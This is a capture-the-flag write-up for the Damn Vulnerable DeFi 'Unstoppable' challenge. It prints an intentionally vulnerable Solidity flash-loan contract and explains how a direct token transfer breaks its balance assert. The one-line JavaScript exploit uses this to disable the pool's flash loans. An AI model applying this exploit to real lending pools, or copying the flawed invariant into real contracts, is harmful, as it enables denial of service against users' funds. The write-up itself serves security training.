## Unstoppable memes

### Contract

<details><summary>CLICK TO VIEW</summary>
<p>

```solidity
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";

interface IReceiver {
    function receiveTokens(address tokenAddress, uint256 amount) external;
}

/**
 * @title UnstoppableLender
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract UnstoppableLender is ReentrancyGuard {

    IERC20 public immutable damnValuableToken;
    uint256 public poolBalance;

    constructor(address tokenAddress) {
        require(tokenAddress != address(0), "Token address cannot be zero");
        damnValuableToken = IERC20(tokenAddress);
    }

    function depositTokens(uint256 amount) external nonReentrant {
        require(amount > 0, "Must deposit at least one token"); // Cannot exploit
        // Transfer token from sender. Sender must have first approved them.
        damnValuableToken.transferFrom(msg.sender, address(this), amount);
        poolBalance = poolBalance + amount;
    }

    function flashLoan(uint256 borrowAmount) external nonReentrant {
        require(borrowAmount > 0, "Must borrow at least one token"); // Cannot exploit

        uint256 balanceBefore = damnValuableToken.balanceOf(address(this)); 

        require(balanceBefore >= borrowAmount, "Not enough tokens in pool");

        // Ensured by the protocol via the `depositTokens` function
        assert(poolBalance == balanceBefore); // This looks hella exploitable
        
        damnValuableToken.transfer(msg.sender, borrowAmount);
        
        IReceiver(msg.sender).receiveTokens(address(damnValuableToken), borrowAmount);
        
        uint256 balanceAfter = damnValuableToken.balanceOf(address(this));
        require(balanceAfter >= balanceBefore, "Flash loan hasn't been paid back");
    }
}
```
```solidity
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "../unstoppable/UnstoppableLender.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

/**
 * @title ReceiverUnstoppable
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract ReceiverUnstoppable {

    UnstoppableLender private immutable pool;
    address private immutable owner;

    constructor(address poolAddress) {
        pool = UnstoppableLender(poolAddress);
        owner = msg.sender;
    }

    // Pool will call this function during the flash loan
    function receiveTokens(address tokenAddress, uint256 amount) external {
        require(msg.sender == address(pool), "Sender must be pool");
        // Return all tokens to the pool
        require(IERC20(tokenAddress).transfer(msg.sender, amount), "Transfer of tokens failed");
    }

    function executeFlashLoan(uint256 amount) external {
        require(msg.sender == owner, "Only owner can execute flash loan");
        pool.flashLoan(amount);
    }
} 
```
  
</p>
</details>

### Solution

I saw this same type of vulnerability in [ethernaut's force challenge](https://github.com/terminalsin/writeups/blob/main/ethernaut/7-force.md), although it was
more interesting on there. In a nutshell, the vulnerability is situated here:

```solidity
        assert(poolBalance == balanceBefore); // This looks hella exploitable
```

For some odd reason, the pool calculates the balance when funds are deposited through the deposit function. How about we... deposit some by using the receive
default function!

```javascript
it('Exploit', async function () {
    /** CODE YOUR EXPLOIT HERE */

    // V1 was better imo wtf is this
    await this.token.transfer(this.pool.address, INITIAL_ATTACKER_TOKEN_BALANCE);
});
```

Easy peasy.
